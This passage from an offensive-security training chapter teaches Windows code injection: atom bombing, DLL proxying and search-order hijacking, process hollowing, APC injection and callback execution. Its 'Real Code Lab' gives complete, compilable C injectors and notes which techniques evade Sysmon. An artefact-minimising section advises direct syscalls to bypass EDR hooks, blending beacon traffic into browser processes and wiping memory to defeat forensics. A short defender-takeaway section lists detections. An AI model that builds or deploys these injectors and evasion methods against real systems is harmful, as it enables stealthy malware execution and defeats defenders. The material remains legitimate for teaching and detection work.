must leave zero trace when you're done.
```

---

## Section 7 — Atom Bombing

An esoteric technique using the Windows Global Atom Table as a covert
data channel. Predates modern EDRs, largely detected now but instructive
for understanding creative injection paths.

### The Concept

```
1. Store shellcode as atoms in the global atom table:
   AddAtom() stores strings globally — any process can retrieve them

2. Target an alertable thread with NtSetContextThread
   (or QueueUserAPC) to call GlobalGetAtomName into its stack

3. Multiple APC calls reconstruct the shellcode on the target stack

4. Final APC calls NtProtectVirtualMemory to make the stack executable

5. Final APC calls the shellcode address (now on target stack)
```

```c
// Store shellcode bytes as atom names — atoms are globally accessible strings
ATOM atoms[64];
for (int i = 0; i < chunk_count; i++) {
    // Pack one chunk of shellcode bytes into a wide string (null-padded)
    wchar_t atom_name[256] = {0};
    memcpy(atom_name, shellcode + (i * CHUNK_SIZE), CHUNK_SIZE);
    // GlobalAddAtomW stores the string in the kernel's global atom table
    atoms[i] = GlobalAddAtomW(atom_name);
}

// Queue APCs to reconstruct shellcode in target process
// Each APC calls GlobalGetAtomName with a stack offset
// This writes shellcode bytes onto the target thread's stack
```

This technique is academic at this point. Modern EDRs flag the unusual
atom table usage patterns. Include it in your understanding of the
creative design space — the PRINCIPLE (using legitimate Windows IPC
as a covert channel) is more valuable than the specific implementation.

---

## Section 8 — DLL Proxying

Not injection in the traditional sense — no OpenProcess, no remote
thread. DLL proxying is about REPLACEMENT. You substitute a malicious
DLL for a legitimate one. The malicious DLL forwards all calls to the
real DLL (hence "proxy") while executing additional code.

### The Concept

```
Normal load order:
    Application → imports WINHTTP.dll → loads from System32

Hijacked load order:
    Application → imports WINHTTP.dll
              → Windows searches application directory FIRST
              → finds your malicious winhttp.dll there
              → loads it
              → your DLL loads the real winhttp.dll from System32
              → forwards all function calls transparently
              → also runs your payload
```

### Creating A Proxy DLL

Tools: SharpDLLProxy, DLL-Proxy-Generator, or manual DEF file approach.

```
// Step 1: Identify the target DLL
// Find a DLL that the application imports (use PE-bear or dumpbin)
dumpbin /imports target_app.exe

// Step 2: Export all functions from the real DLL as forwards
// .DEF file approach — each line forwards to the real DLL:
// EXPORTS
//   HttpOpenRequestW = C:\Windows\System32\winhttp.HttpOpenRequestW @1
//   ...

// Automated: DLL-Proxy-Generator
python generate.py -d C:\Windows\System32\winhttp.dll
// Outputs: winhttp_proxy.cpp + winhttp.def
// Add your payload to DllMain or any exported function
```

```c
// DllMain in your proxy DLL — this runs when any process loads your fake DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpvReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // DLL_PROCESS_ATTACH fires once when the DLL is first loaded
        // This is where you run your payload code
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;   // Must return TRUE or the DLL load fails and the app crashes
}
```

#### Compile Your Proxy DLL

```powershell
# Compile as a DLL (not an EXE) using MinGW
# -shared = output a DLL
# winhttp.def = your DEF file that forwards all exports to the real DLL
gcc -shared -o winhttp.dll proxy_main.c winhttp.def -lkernel32
```

#### Expected Output

Place `winhttp.dll` in the same folder as the target application, then
launch the application. In Process Hacker → target process → Modules:
you should see your proxy DLL loaded from the application directory,
not from System32. Your payload thread should be visible in the Threads tab.

Failure looks like: application crashes on startup — your DLL loaded but
a forwarded function failed. Check the .def file covers ALL exports from
the real DLL. Use `dumpbin /exports C:\Windows\System32\winhttp.dll` to
list every function that must be forwarded.

### Hijack Search Order Targets

```
DLL search order (simplified, SafeDllSearchMode disabled):
    1. Application directory (EXE's folder)
    2. Current working directory
    3. System32
    4. System
    5. Windows directory
    6. PATH

High-value targets (commonly missing from application directories):
    winhttp.dll     — tons of apps import it
    version.dll     — almost universally imported by older apps
    dbghelp.dll     — debugging apps
    uxtheme.dll     — GUI applications
    wtsapi32.dll    — terminal services-aware apps

Identify missing DLLs: Process Monitor → filter for "NAME NOT FOUND" + "dll"
```

### Detection Artefacts

```
DLL loaded from unusual path         — module path ≠ System32/SysWOW64
                                       Detected by: EDR module load monitoring
                                       Sysmon Event ID 7 (ImageLoad) with path check

DLL without valid signature          — legitimate system DLLs are MS-signed
                                       Detected by: code signing validation
                                       Can be bypassed if app doesn't enforce signing

DLL with both unexpected exports     — proxy DLL has all legit exports PLUS extras
AND DllMain payload                   Detected by: static analysis of the DLL
```

---

## Section 9 — Detection Artefacts Consolidated

Everything in this chapter produces observable signals. Know what
you generate. Choose your technique based on the detection environment.

```
TECHNIQUE              KEY ARTEFACT                    PRIMARY DETECTOR
──────────────────────────────────────────────────────────────────────────
Classic DLL inject    CreateRemoteThread               Sysmon Event 8
                      DLL file on disk                 File monitoring, EDR

Shellcode inject      RWX memory in target             Memory scanner
                      Thread start in non-module       ETW memory events

Reflective DLL        Non-module executable memory     Volatility malfind
                      PE headers in heap               YARA memory scan

Process hollowing     Image ≠ file on disk             EDR code integrity
                      NtUnmapViewOfSection             ETW API monitoring

APC injection         QueueUserAPC                     ETW (limited)
                      Non-module APC target            Mature EDR hooks

Early-bird APC        Suspended process + VirtualAlloc  EDR behavioral pattern
                      + APC + Resume sequence

Thread hijacking      SetThreadContext on foreign       ETW, EDR thread hooks
                      thread, RIP modification

Atom bombing          Unusual GlobalAtom API use        EDR behavioral analysis

DLL proxying          DLL loaded from wrong path        Sysmon Event 7 + path
                      Unsigned DLL                     Code signing checks
```

### Minimising Artefacts

```
General principles:
1. Prefer syscalls over Win32 API
   — EDR hooks WinAPI functions, not raw syscalls
   — Use SysWhispers or HellsGate to make direct syscalls
   — NtAllocateVirtualMemory instead of VirtualAllocEx
   — NtWriteVirtualMemory instead of WriteProcessMemory
   — NtCreateThreadEx instead of CreateRemoteThread

2. Avoid RWX memory
   — Allocate RW, write, flip to RX with separate VirtualProtect call
   — Some advanced techniques avoid ever having executable+writable

3. Prefer existing threads over new ones
   — CreateRemoteThread is loud
   — APC injection, thread hijacking, and SetWindowsHookEx avoid it

4. Choose target processes carefully
   — Inject into processes that legitimately make network connections
   — Match the beacon callback behavior to the host process's normal traffic
   — svchost.exe calling out to a random IP is suspicious
   — chrome.exe calling out to an IP is less suspicious

5. Clean up
   — Free remote allocations when done if possible
   — Zero memory before freeing to eliminate forensic content
   — Remove injected DLL from target's module list if using reflective technique
```

---

## DEFENDER TAKEAWAY

You just learned nine ways attackers push code into processes they don't
own. Here is what you do Monday morning to make every one of these harder
to pull off and easier to catch.

- **Deploy Sysmon with a tuned config and watch Event ID 8 (CreateRemoteThread)
  and Event ID 10 (ProcessAccess).** These two events catch classic DLL
  injection and shellcode injection before they finish. The SwiftOnSecurity
  Sysmon config is a free starting point:
  `https://github.com/SwiftOnSecurity/sysmon-config`

- **Enable Windows Event ID 4688 (Process Creation) with command-line
  logging.** Group Policy: Computer Configuration → Administrative Templates
  → System → Audit Process Creation → "Include command line in process
  creation events." Hollowed processes show a mismatch between the image
  path in 4688 and what memory forensics shows is actually running.

- **Block unsigned DLLs in application directories.** Use Windows Defender
  Application Control (WDAC) or AppLocker DLL rules to prevent unsigned
  DLLs from loading. This kills DLL proxying and search order hijacking
  for any application that participates in the policy.

- **Enable Process Protection (PPL) for sensitive processes.** lsass.exe
  can be run as a PPL through Group Policy or registry:
  `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `RunAsPPL = 1`
  This makes OpenProcess return ACCESS_DENIED for all injection attempts.

- **Baseline your process module lists.** Know which DLLs every sensitive
  process should have loaded. Anything outside that list at runtime is
  a detection signal. EDRs do this automatically — if you don't have an
  EDR, Process Hacker and a scheduled task can export module lists for
  manual comparison.

- **Hunt for RWX memory regions in live processes.** Normal processes do
  not have memory that is simultaneously readable, writable, and executable.
  Any RWX region in a long-running process is a red flag. Process Hacker →
  any process → Memory tab → filter for "RWX" in the Protection column.

- **Audit alertable wait patterns in critical processes.** Standard user
  processes that spend time in `SleepEx` or `WaitForSingleObjectEx` are
  APC injection targets. If a process has no business entering alertable
  waits, that behavior change is detectable via ETW.

- **Run Volatility `malfind` against memory dumps from incident systems.**
  `malfind` hunts for PE headers in non-module memory — the exact signature
  of reflective DLL injection and process hollowing. It does not require
  live access. Add it to your incident response runbook alongside standard
  triage steps.

---

## Key Terms

| Term | Definition |
|------|-----------|
| **DLL injection** | Writing a DLL path into a remote process and calling LoadLibrary via a remote thread |
| **Shellcode injection** | Writing raw machine code into remote process memory and executing it directly |
| **Reflective DLL injection** | Self-loading DLL that maps itself without calling LoadLibrary; never appears in module list |
| **Process hollowing** | Creating a suspended legitimate process, replacing its code with payload code, resuming |
| **APC injection** | Queuing shellcode execution via the thread APC mechanism; runs when thread enters alertable state |
| **Early-bird APC** | Queuing APC to a newly-created suspended process before it runs any code |
| **Thread hijacking** | Suspending a running thread, modifying its RIP, and resuming it to run your code |
| **Atom bombing** | Using the Global Atom Table as a covert data channel to transfer shellcode |
| **DLL proxying** | Replacing a legitimate DLL with one that forwards all calls to the real DLL plus runs payload |
| **DLL search order hijacking** | Placing a malicious DLL in a location earlier in the search order than the legitimate one |
| **VAD (Virtual Address Descriptor)** | Kernel data structure tracking virtual memory regions; non-module executable regions are anomalous |
| **PEB (Process Environment Block)** | Per-process structure in user space containing ImageBase, module list, heap info |
| **AlertableWait** | Kernel state entered by SleepEx, WaitForSingleObjectEx — required for APC execution |
| **NtUnmapViewOfSection** | Undocumented ntdll export used to unmap a section from a process; central to process hollowing |
| **ETW (Event Tracing for Windows)** | High-speed kernel telemetry framework; source of most EDR observability |

---

## Drill 10 — Code Injection

Go to `DRILLS/10_code_injection/`. A target process is running. Tools and
a test DLL payload are provided.

Your missions:

1. **Classic DLL injection**: Inject `payload.dll` into `target.exe` using
   the four-call chain. Verify with Process Hacker — check the module list.

2. **Shellcode injection**: Use the provided calc-spawning shellcode. Inject
   via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread. Verify
   calc.exe spawns as child of target.

3. **Reflective DLL**: Inject `reflective_payload.dll` using sRDI output.
   Verify it does NOT appear in target's module list (check Process Hacker,
   WinDbg `lm`, and `!dlls`).

4. **Process hollowing**: Hollow notepad.exe with the provided payload binary.
   Verify via Process Hacker memory map — the PE headers should not match
   notepad.exe on disk.

5. **Early-bird APC**: Spawn svchost.exe suspended, inject shellcode via
   early-bird, resume. Shellcode must execute BEFORE svchost's own code.
   Verify with WinDbg: break on process start, check APC queue state.

6. **Detection exercise**: Run each technique and capture Sysmon logs.
   Document which Event IDs fire for each technique. Map each artefact
   to the consolidated table in Section 9.

The goal of step 6 is as important as the injection itself. You must
understand what the defender sees. If you don't know the artefact,
you can't suppress it.

---

— cold steel forged in memory,
every THREAD a wire drawn through someone else's house


---

## Real Code Lab — Build Every Technique from Zero

Compile all examples with:
```
x86_64-w64-mingw32-gcc inject.c -o inject.exe -lkernel32
```

---

### Lab 1 — Find a Target PID by Process Name

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD getPidByName(const char *name) {
    PROCESSENTRY32 entry = { sizeof(entry) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    if (Process32First(snap, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, name) == 0) {
                CloseHandle(snap);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snap, &entry));
    }
    CloseHandle(snap);
    return 0;
}

int main() {
    DWORD pid = getPidByName("notepad.exe");
    printf(pid ? "[+] PID: %lu\n" : "[-] not found\n", pid);
    return 0;
}
```

// DRILL: Find all running svchost.exe PIDs — there will be multiple.

---

### Lab 2 — Classic Shellcode Injection via CreateRemoteThread

Open → Allocate RWX → Write → Execute. Foundational. Most detected.

```c
#include <windows.h>
#include <stdio.h>

// Replace with msfvenom -p windows/x64/exec CMD=calc.exe -f c output
unsigned char shellcode[] = { 0x90, 0x90, 0xC3 };  // NOP NOP RET placeholder
SIZE_T shellcode_len = sizeof(shellcode);

int inject_crt(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess: %lu\n", GetLastError()); return 1; }

    // VirtualAllocEx RWX — Sysmon watches this
    LPVOID remote = VirtualAllocEx(hProc, NULL, shellcode_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) { printf("[-] VirtualAllocEx failed\n"); return 1; }

    SIZE_T written;
    WriteProcessMemory(hProc, remote, shellcode, shellcode_len, &written);
    printf("[+] wrote %zu bytes to %p\n", written, remote);

    // CreateRemoteThread — Sysmon Event ID 8 fires here
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread: %lu\n", GetLastError()); return 1; }

    printf("[+] remote thread TID: %lu\n", GetThreadId(hThread));
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

**Sysmon fires:** Event ID 10 (OpenProcess) + Event ID 8 (CreateRemoteThread).
**Evasion:** Use APC injection instead — no Event ID 8.

// DRILL: Inject a shellcode that calls MessageBoxA. Capture Sysmon logs.
// Map every Event ID to the exact line of C that triggered it.

---

### Lab 3 — Process Hollowing

Spawn svchost.exe suspended → overwrite its memory with your PE → redirect entry point → resume. Task Manager shows svchost. Your code runs.

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int hollow(const char *target, unsigned char *payload, SIZE_T payload_size) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // Spawn suspended — no code runs yet
    if (!CreateProcessA(NULL, (LPSTR)target, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError()); return 1;
    }
    printf("[*] %s spawned suspended PID=%lu\n", target, pi.dwProcessId);

    // Get PEB to find image base
    pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = {0};
    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    // Read ImageBaseAddress from PEB (offset 0x10 on x64)
    LPVOID image_base;
    ReadProcessMemory(pi.hProcess,
                      (LPVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10),
                      &image_base, sizeof(image_base), NULL);
    printf("[*] image base: %p\n", image_base);

    // Write payload at image base
    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base, payload_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, new_base, payload, payload_size, NULL);

    // Redirect RIP to payload entry point
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload +
        ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
    LPVOID oep = (LPVOID)((ULONG_PTR)new_base +
        nt->OptionalHeader.AddressOfEntryPoint);

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)oep;  // x64: entry point in RCX
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] OEP redirected to %p — resuming\n", oep);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

// DRILL: Hollow notepad.exe with a payload that spawns calc.exe.
// Verify: Task Manager shows notepad, but calc is a child process.
// Use Process Hacker memory map — PE headers will not match disk.

---

### Lab 4 — APC Injection (No Sysmon Event ID 8)

Queue shellcode as an Asynchronous Procedure Call. No CreateRemoteThread.
No Event ID 8. Thread executes it on next alertable wait.

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD getFirstThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(snap);
                return te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return 0;
}

int apc_inject(DWORD pid, unsigned char *sc, SIZE_T sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remote = VirtualAllocEx(hProc, NULL, sc_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T written;
    WriteProcessMemory(hProc, remote, sc, sc_len, &written);

    DWORD tid = getFirstThread(pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    printf("[*] queuing APC on thread %lu\n", tid);

    // QueueUserAPC — fires when thread calls SleepEx/WaitForSingleObjectEx
    // with bAlertable=TRUE. Notepad/explorer threads do this constantly.
    if (!QueueUserAPC((PAPCFUNC)remote, hThread, 0)) {
        printf("[-] QueueUserAPC: %lu\n", GetLastError()); return 1;
    }
    printf("[+] APC queued at %p — waiting for alertable state\n", remote);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

**No Sysmon Event ID 8.** The thread that executes your shellcode is the
target's own thread — not one you created. Alertable threads in notepad,
explorer, and most GUI applications call SleepEx or MsgWaitForMultipleObjectsEx
continuously. Your APC fires within seconds.

// DRILL: APC-inject into notepad.exe. Run Sysmon. Confirm Event ID 8 is
// absent. Compare the log to Lab 2 CRT injection.

---

### Lab 5 — Callback Execution (Zero Thread Creation)

`EnumWindows` takes a callback function pointer. Point it at shellcode.
No thread spawn. No APC. No CreateRemoteThread.

```c
#include <windows.h>
#include <stdio.h>

void callback_exec(unsigned char *sc, SIZE_T len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc, len);

    // Shellcode runs as an EnumWindows callback — BOOL CALLBACK fn(HWND, LPARAM)
    EnumWindows((WNDENUMPROC)mem, 0);
    printf("[+] callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}
```

**Other callback vectors — all work the same way:**
```c
EnumChildWindows(NULL, (WNDENUMPROC)sc, 0);
EnumSystemLocalesA((LOCALE_ENUMPROCA)sc, 0);
CreateTimerQueueTimer(&t, NULL, (WAITORTIMERCALLBACK)sc, NULL, 0, 0, 0);
```

// DRILL: Execute a MessageBoxA stub via EnumWindows. Check Sysmon for
// thread creation events — there should be none.

---

### Detection Map

| Technique | Sysmon Event ID | Evades CRT detection? |
|---|---|---|
| CreateRemoteThread | 8 (always) | No |
| APC Injection | None | Yes |
| Process Hollowing | 1 (process spawn) | Partial |
| Callback Exec | None | Yes |

Move left on this table. Know what you leave behind.

---

// DRILL CAPSTONE: Build one injector that:
// 1. Finds notepad.exe PID via Toolhelp32
// 2. Injects shellcode via APC — no Event ID 8
// 3. Shellcode calls WinExec("calc.exe", SW_SHOW)
// 4. Run Sysmon — document every event that fires
// 5. Look up PPID spoofing — eliminate Event ID 1 as a stretch goal
